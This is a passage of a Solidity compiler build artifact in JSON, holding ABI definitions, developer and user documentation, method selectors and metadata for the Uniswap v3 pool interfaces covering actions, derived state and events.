					],
					"devdoc": {
						"kind": "dev",
						"methods": {
							"burn(int24,int24,uint128)": {
								"details": "Can be used to trigger a recalculation of fees owed to a position by calling with an amount of 0Fees must be collected separately via a call to #collect",
								"params": {
									"amount": "How much liquidity to burn",
									"tickLower": "The lower tick of the position for which to burn liquidity",
									"tickUpper": "The upper tick of the position for which to burn liquidity"
								},
								"returns": {
									"amount0": "The amount of token0 sent to the recipient",
									"amount1": "The amount of token1 sent to the recipient"
								}
							},
							"collect(address,int24,int24,uint128,uint128)": {
								"details": "Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity. Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.",
								"params": {
									"amount0Requested": "How much token0 should be withdrawn from the fees owed",
									"amount1Requested": "How much token1 should be withdrawn from the fees owed",
									"recipient": "The address which should receive the fees collected",
									"tickLower": "The lower tick of the position for which to collect fees",
									"tickUpper": "The upper tick of the position for which to collect fees"
								},
								"returns": {
									"amount0": "The amount of fees collected in token0",
									"amount1": "The amount of fees collected in token1"
								}
							},
							"flash(address,uint256,uint256,bytes)": {
								"details": "The caller of this method receives a callback in the form of IUniswapV3FlashCallback#uniswapV3FlashCallbackCan be used to donate underlying tokens pro-rata to currently in-range liquidity providers by calling with 0 amount{0,1} and sending the donation amount(s) from the callback",
								"params": {
									"amount0": "The amount of token0 to send",
									"amount1": "The amount of token1 to send",
									"data": "Any data to be passed through to the callback",
									"recipient": "The address which will receive the token0 and token1 amounts"
								}
							},
							"increaseObservationCardinalityNext(uint16)": {
								"details": "This method is no-op if the pool already has an observationCardinalityNext greater than or equal to the input observationCardinalityNext.",
								"params": {
									"observationCardinalityNext": "The desired minimum number of observations for the pool to store"
								}
							},
							"initialize(uint160)": {
								"details": "Price is represented as a sqrt(amountToken1/amountToken0) Q64.96 value",
								"params": {
									"sqrtPriceX96": "the initial sqrt price of the pool as a Q64.96"
								}
							},
							"mint(address,int24,int24,uint128,bytes)": {
								"details": "The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends on tickLower, tickUpper, the amount of liquidity, and the current price.",
								"params": {
									"amount": "The amount of liquidity to mint",
									"data": "Any data that should be passed through to the callback",
									"recipient": "The address for which the liquidity will be created",
									"tickLower": "The lower tick of the position in which to add liquidity",
									"tickUpper": "The upper tick of the position in which to add liquidity"
								},
								"returns": {
									"amount0": "The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback",
									"amount1": "The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback"
								}
							},
							"swap(address,bool,int256,uint160,bytes)": {
								"details": "The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback",
								"params": {
									"amountSpecified": "The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)",
									"data": "Any data to be passed through to the callback",
									"recipient": "The address to receive the output of the swap",
									"sqrtPriceLimitX96": "The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this value after the swap. If one for zero, the price cannot be greater than this value after the swap",
									"zeroForOne": "The direction of the swap, true for token0 to token1, false for token1 to token0"
								},
								"returns": {
									"amount0": "The delta of the balance of token0 of the pool, exact when negative, minimum when positive",
									"amount1": "The delta of the balance of token1 of the pool, exact when negative, minimum when positive"
								}
							}
						},
						"title": "Permissionless pool actions",
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"burn(int24,int24,uint128)": "a34123a7",
							"collect(address,int24,int24,uint128,uint128)": "4f1eb3d8",
							"flash(address,uint256,uint256,bytes)": "490e6cbc",
							"increaseObservationCardinalityNext(uint16)": "32148f67",
							"initialize(uint160)": "f637731d",
							"mint(address,int24,int24,uint128,bytes)": "3c8a7d8d",
							"swap(address,bool,int256,uint160,bytes)": "128acb08"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"}],\"name\":\"burn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"internalType\":\"uint128\",\"name\":\"amount0Requested\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1Requested\",\"type\":\"uint128\"}],\"name\":\"collect\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"flash\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint16\",\"name\":\"observationCardinalityNext\",\"type\":\"uint16\"}],\"name\":\"increaseObservationCardinalityNext\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"}],\"name\":\"initialize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"mint\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"zeroForOne\",\"type\":\"bool\"},{\"internalType\":\"int256\",\"name\":\"amountSpecified\",\"type\":\"int256\"},{\"internalType\":\"uint160\",\"name\":\"sqrtPriceLimitX96\",\"type\":\"uint160\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"swap\",\"outputs\":[{\"internalType\":\"int256\",\"name\":\"amount0\",\"type\":\"int256\"},{\"internalType\":\"int256\",\"name\":\"amount1\",\"type\":\"int256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{\"burn(int24,int24,uint128)\":{\"details\":\"Can be used to trigger a recalculation of fees owed to a position by calling with an amount of 0Fees must be collected separately via a call to #collect\",\"params\":{\"amount\":\"How much liquidity to burn\",\"tickLower\":\"The lower tick of the position for which to burn liquidity\",\"tickUpper\":\"The upper tick of the position for which to burn liquidity\"},\"returns\":{\"amount0\":\"The amount of token0 sent to the recipient\",\"amount1\":\"The amount of token1 sent to the recipient\"}},\"collect(address,int24,int24,uint128,uint128)\":{\"details\":\"Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity. Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.\",\"params\":{\"amount0Requested\":\"How much token0 should be withdrawn from the fees owed\",\"amount1Requested\":\"How much token1 should be withdrawn from the fees owed\",\"recipient\":\"The address which should receive the fees collected\",\"tickLower\":\"The lower tick of the position for which to collect fees\",\"tickUpper\":\"The upper tick of the position for which to collect fees\"},\"returns\":{\"amount0\":\"The amount of fees collected in token0\",\"amount1\":\"The amount of fees collected in token1\"}},\"flash(address,uint256,uint256,bytes)\":{\"details\":\"The caller of this method receives a callback in the form of IUniswapV3FlashCallback#uniswapV3FlashCallbackCan be used to donate underlying tokens pro-rata to currently in-range liquidity providers by calling with 0 amount{0,1} and sending the donation amount(s) from the callback\",\"params\":{\"amount0\":\"The amount of token0 to send\",\"amount1\":\"The amount of token1 to send\",\"data\":\"Any data to be passed through to the callback\",\"recipient\":\"The address which will receive the token0 and token1 amounts\"}},\"increaseObservationCardinalityNext(uint16)\":{\"details\":\"This method is no-op if the pool already has an observationCardinalityNext greater than or equal to the input observationCardinalityNext.\",\"params\":{\"observationCardinalityNext\":\"The desired minimum number of observations for the pool to store\"}},\"initialize(uint160)\":{\"details\":\"Price is represented as a sqrt(amountToken1/amountToken0) Q64.96 value\",\"params\":{\"sqrtPriceX96\":\"the initial sqrt price of the pool as a Q64.96\"}},\"mint(address,int24,int24,uint128,bytes)\":{\"details\":\"The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends on tickLower, tickUpper, the amount of liquidity, and the current price.\",\"params\":{\"amount\":\"The amount of liquidity to mint\",\"data\":\"Any data that should be passed through to the callback\",\"recipient\":\"The address for which the liquidity will be created\",\"tickLower\":\"The lower tick of the position in which to add liquidity\",\"tickUpper\":\"The upper tick of the position in which to add liquidity\"},\"returns\":{\"amount0\":\"The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback\",\"amount1\":\"The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback\"}},\"swap(address,bool,int256,uint160,bytes)\":{\"details\":\"The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback\",\"params\":{\"amountSpecified\":\"The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)\",\"data\":\"Any data to be passed through to the callback\",\"recipient\":\"The address to receive the output of the swap\",\"sqrtPriceLimitX96\":\"The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this value after the swap. If one for zero, the price cannot be greater than this value after the swap\",\"zeroForOne\":\"The direction of the swap, true for token0 to token1, false for token1 to token0\"},\"returns\":{\"amount0\":\"The delta of the balance of token0 of the pool, exact when negative, minimum when positive\",\"amount1\":\"The delta of the balance of token1 of the pool, exact when negative, minimum when positive\"}}},\"title\":\"Permissionless pool actions\",\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{\"burn(int24,int24,uint128)\":{\"notice\":\"Burn liquidity from the sender and account tokens owed for the liquidity to the position\"},\"collect(address,int24,int24,uint128,uint128)\":{\"notice\":\"Collects tokens owed to a position\"},\"flash(address,uint256,uint256,bytes)\":{\"notice\":\"Receive token0 and/or token1 and pay it back, plus a fee, in the callback\"},\"increaseObservationCardinalityNext(uint16)\":{\"notice\":\"Increase the maximum number of price and liquidity observations that this pool will store\"},\"initialize(uint160)\":{\"notice\":\"Sets the initial price for the pool\"},\"mint(address,int24,int24,uint128,bytes)\":{\"notice\":\"Adds liquidity for the given recipient/tickLower/tickUpper position\"},\"swap(address,bool,int256,uint160,bytes)\":{\"notice\":\"Swap token0 for token1, or token1 for token0\"}},\"notice\":\"Contains pool methods that can be called by anyone\",\"version\":1}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol\":\"IUniswapV3PoolActions\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol\":{\"keccak256\":\"0x9453dd0e7442188667d01d9b65de3f1e14e9511ff3e303179a15f6fc267f7634\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://982f4328f956c3e60e67501e759eb292ac487f76460c774c50e9ae4fcc92aae5\",\"dweb:/ipfs/QmRnzEDsaqtd9PJEVcgQi7p5aV5pMSvRUoGZJAdwFUJxgZ\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {
							"burn(int24,int24,uint128)": {
								"notice": "Burn liquidity from the sender and account tokens owed for the liquidity to the position"
							},
							"collect(address,int24,int24,uint128,uint128)": {
								"notice": "Collects tokens owed to a position"
							},
							"flash(address,uint256,uint256,bytes)": {
								"notice": "Receive token0 and/or token1 and pay it back, plus a fee, in the callback"
							},
							"increaseObservationCardinalityNext(uint16)": {
								"notice": "Increase the maximum number of price and liquidity observations that this pool will store"
							},
							"initialize(uint160)": {
								"notice": "Sets the initial price for the pool"
							},
							"mint(address,int24,int24,uint128,bytes)": {
								"notice": "Adds liquidity for the given recipient/tickLower/tickUpper position"
							},
							"swap(address,bool,int256,uint160,bytes)": {
								"notice": "Swap token0 for token1, or token1 for token0"
							}
						},
						"notice": "Contains pool methods that can be called by anyone",
						"version": 1
					}
				}
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol": {
				"IUniswapV3PoolDerivedState": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "uint32[]",
									"name": "secondsAgos",
									"type": "uint32[]"
								}
							],
							"name": "observe",
							"outputs": [
								{
									"internalType": "int56[]",
									"name": "tickCumulatives",
									"type": "int56[]"
								},
								{
									"internalType": "uint160[]",
									"name": "secondsPerLiquidityCumulativeX128s",
									"type": "uint160[]"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								}
							],
							"name": "snapshotCumulativesInside",
							"outputs": [
								{
									"internalType": "int56",
									"name": "tickCumulativeInside",
									"type": "int56"
								},
								{
									"internalType": "uint160",
									"name": "secondsPerLiquidityInsideX128",
									"type": "uint160"
								},
								{
									"internalType": "uint32",
									"name": "secondsInside",
									"type": "uint32"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {
							"observe(uint32[])": {
								"details": "To get a time weighted average tick or liquidity-in-range, you must call this with two values, one representing the beginning of the period and another for the end of the period. E.g., to get the last hour time-weighted average tick, you must call it with secondsAgos = [3600, 0].The time weighted average tick represents the geometric time weighted average price of the pool, in log base sqrt(1.0001) of token1 / token0. The TickMath library can be used to go from a tick value to a ratio.",
								"params": {
									"secondsAgos": "From how long ago each cumulative tick and liquidity value should be returned"
								},
								"returns": {
									"secondsPerLiquidityCumulativeX128s": "Cumulative seconds per liquidity-in-range value as of each `secondsAgos` from the current block timestamp",
									"tickCumulatives": "Cumulative tick values as of each `secondsAgos` from the current block timestamp"
								}
							},
							"snapshotCumulativesInside(int24,int24)": {
								"details": "Snapshots must only be compared to other snapshots, taken over a period for which a position existed. I.e., snapshots cannot be compared if a position is not held for the entire period between when the first snapshot is taken and the second snapshot is taken.",
								"params": {
									"tickLower": "The lower tick of the range",
									"tickUpper": "The upper tick of the range"
								},
								"returns": {
									"secondsInside": "The snapshot of seconds per liquidity for the range",
									"secondsPerLiquidityInsideX128": "The snapshot of seconds per liquidity for the range",
									"tickCumulativeInside": "The snapshot of the tick accumulator for the range"
								}
							}
						},
						"title": "Pool state that is not stored",
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"observe(uint32[])": "883bdbfd",
							"snapshotCumulativesInside(int24,int24)": "a38807f2"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"uint32[]\",\"name\":\"secondsAgos\",\"type\":\"uint32[]\"}],\"name\":\"observe\",\"outputs\":[{\"internalType\":\"int56[]\",\"name\":\"tickCumulatives\",\"type\":\"int56[]\"},{\"internalType\":\"uint160[]\",\"name\":\"secondsPerLiquidityCumulativeX128s\",\"type\":\"uint160[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"}],\"name\":\"snapshotCumulativesInside\",\"outputs\":[{\"internalType\":\"int56\",\"name\":\"tickCumulativeInside\",\"type\":\"int56\"},{\"internalType\":\"uint160\",\"name\":\"secondsPerLiquidityInsideX128\",\"type\":\"uint160\"},{\"internalType\":\"uint32\",\"name\":\"secondsInside\",\"type\":\"uint32\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{\"observe(uint32[])\":{\"details\":\"To get a time weighted average tick or liquidity-in-range, you must call this with two values, one representing the beginning of the period and another for the end of the period. E.g., to get the last hour time-weighted average tick, you must call it with secondsAgos = [3600, 0].The time weighted average tick represents the geometric time weighted average price of the pool, in log base sqrt(1.0001) of token1 / token0. The TickMath library can be used to go from a tick value to a ratio.\",\"params\":{\"secondsAgos\":\"From how long ago each cumulative tick and liquidity value should be returned\"},\"returns\":{\"secondsPerLiquidityCumulativeX128s\":\"Cumulative seconds per liquidity-in-range value as of each `secondsAgos` from the current block timestamp\",\"tickCumulatives\":\"Cumulative tick values as of each `secondsAgos` from the current block timestamp\"}},\"snapshotCumulativesInside(int24,int24)\":{\"details\":\"Snapshots must only be compared to other snapshots, taken over a period for which a position existed. I.e., snapshots cannot be compared if a position is not held for the entire period between when the first snapshot is taken and the second snapshot is taken.\",\"params\":{\"tickLower\":\"The lower tick of the range\",\"tickUpper\":\"The upper tick of the range\"},\"returns\":{\"secondsInside\":\"The snapshot of seconds per liquidity for the range\",\"secondsPerLiquidityInsideX128\":\"The snapshot of seconds per liquidity for the range\",\"tickCumulativeInside\":\"The snapshot of the tick accumulator for the range\"}}},\"title\":\"Pool state that is not stored\",\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{\"observe(uint32[])\":{\"notice\":\"Returns the cumulative tick and liquidity as of each timestamp `secondsAgo` from the current block timestamp\"},\"snapshotCumulativesInside(int24,int24)\":{\"notice\":\"Returns a snapshot of the tick cumulative, seconds per liquidity and seconds inside a tick range\"}},\"notice\":\"Contains view functions to provide information about the pool that is computed rather than stored on the blockchain. The functions here may have variable gas costs.\",\"version\":1}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol\":\"IUniswapV3PoolDerivedState\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol\":{\"keccak256\":\"0xe603ac5b17ecdee73ba2b27efdf386c257a19c14206e87eee77e2017b742d9e5\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://8febc9bdb399a4d94bb89f5377732652e2400e4a8dee808201ade6848f9004e7\",\"dweb:/ipfs/QmaKDqYYFU4d2W2iN77aDHptfbFmYZRrMYXHeGpJmM8C1c\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {
							"observe(uint32[])": {
								"notice": "Returns the cumulative tick and liquidity as of each timestamp `secondsAgo` from the current block timestamp"
							},
							"snapshotCumulativesInside(int24,int24)": {
								"notice": "Returns a snapshot of the tick cumulative, seconds per liquidity and seconds inside a tick range"
							}
						},
						"notice": "Contains view functions to provide information about the pool that is computed rather than stored on the blockchain. The functions here may have variable gas costs.",
						"version": 1
					}
				}
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol": {
				"IUniswapV3PoolEvents": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"name": "Burn",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"name": "Collect",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"name": "CollectProtocol",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "paid0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "paid1",
									"type": "uint256"
								}
							],
							"name": "Flash",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint16",
									"name": "observationCardinalityNextOld",
									"type": "uint16"
								},
								{
									"indexed": false,
									"internalType": "uint16",
									"name": "observationCardinalityNextNew",
									"type": "uint16"
								}
							],
							"name": "IncreaseObservationCardinalityNext",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								},
								{
									"indexed": false,
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								}
							],
							"name": "Initialize",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"name": "Mint",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol0Old",
									"type": "uint8"
								},
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol1Old",
									"type": "uint8"
								},
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol0New",
									"type": "uint8"
								},
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol1New",
									"type": "uint8"
								}
							],
							"name": "SetFeeProtocol",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "int256",
									"name": "amount0",
									"type": "int256"
								},
								{
									"indexed": false,
									"internalType": "int256",
									"name": "amount1",
									"type": "int256"
								},
								{
									"indexed": false,
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "liquidity",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								}
							],
							"name": "Swap",
							"type": "event"
						}
					],
					"devdoc": {
						"events": {
							"Burn(address,int24,int24,uint128,uint256,uint256)": {
								"details": "Does not withdraw any fees earned by the liquidity position, which must be withdrawn via #collect",
								"params": {
									"amount": "The amount of liquidity to remove",
									"amount0": "The amount of token0 withdrawn",
									"amount1": "The amount of token1 withdrawn",
									"owner": "The owner of the position for which liquidity is removed",
									"tickLower": "The lower tick of the position",
									"tickUpper": "The upper tick of the position"
								}
							},
							"Collect(address,address,int24,int24,uint128,uint128)": {
								"details": "Collect events may be emitted with zero amount0 and amount1 when the caller chooses not to collect fees",
								"params": {
									"amount0": "The amount of token0 fees collected",
									"amount1": "The amount of token1 fees collected",
									"owner": "The owner of the position for which fees are collected",
									"tickLower": "The lower tick of the position",
									"tickUpper": "The upper tick of the position"
								}
							},
							"CollectProtocol(address,address,uint128,uint128)": {
								"params": {
									"amount0": "The amount of token1 protocol fees that is withdrawn",
									"recipient": "The address that receives the collected protocol fees",
									"sender": "The address that collects the protocol fees"
								}
							},
							"Flash(address,address,uint256,uint256,uint256,uint256)": {
								"params": {
									"amount0": "The amount of token0 that was flashed",
									"amount1": "The amount of token1 that was flashed",
									"paid0": "The amount of token0 paid for the flash, which can exceed the amount0 plus the fee",
									"paid1": "The amount of token1 paid for the flash, which can exceed the amount1 plus the fee",
									"recipient": "The address that received the tokens from flash",
									"sender": "The address that initiated the swap call, and that received the callback"
								}
							},
							"IncreaseObservationCardinalityNext(uint16,uint16)": {
								"details": "observationCardinalityNext is not the observation cardinality until an observation is written at the index just before a mint/swap/burn.",
								"params": {
									"observationCardinalityNextNew": "The updated value of the next observation cardinality",
									"observationCardinalityNextOld": "The previous value of the next observation cardinality"
								}
							},
							"Initialize(uint160,int24)": {
								"details": "Mint/Burn/Swap cannot be emitted by the pool before Initialize",
								"params": {
									"sqrtPriceX96": "The initial sqrt price of the pool, as a Q64.96",
									"tick": "The initial tick of the pool, i.e. log base 1.0001 of the starting price of the pool"
								}
							},
							"Mint(address,address,int24,int24,uint128,uint256,uint256)": {
								"params": {
									"amount": "The amount of liquidity minted to the position range",
									"amount0": "How much token0 was required for the minted liquidity",
									"amount1": "How much token1 was required for the minted liquidity",
									"owner": "The owner of the position and recipient of any minted liquidity",
									"sender": "The address that minted the liquidity",
									"tickLower": "The lower tick of the position",
									"tickUpper": "The upper tick of the position"
								}
							},
							"SetFeeProtocol(uint8,uint8,uint8,uint8)": {
								"params": {
									"feeProtocol0New": "The updated value of the token0 protocol fee",
									"feeProtocol0Old": "The previous value of the token0 protocol fee",
									"feeProtocol1New": "The updated value of the token1 protocol fee",
									"feeProtocol1Old": "The previous value of the token1 protocol fee"
								}
							},
							"Swap(address,address,int256,int256,uint160,uint128,int24)": {
								"params": {
									"amount0": "The delta of the token0 balance of the pool",
									"amount1": "The delta of the token1 balance of the pool",
									"liquidity": "The liquidity of the pool after the swap",
									"recipient": "The address that received the output of the swap",
									"sender": "The address that initiated the swap call, and that received the callback",
									"sqrtPriceX96": "The sqrt(price) of the pool after the swap, as a Q64.96",
									"tick": "The log base 1.0001 of price of the pool after the swap"
								}
							}
						},
						"kind": "dev",
						"methods": {},
						"title": "Events emitted by a pool",
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {}
					},
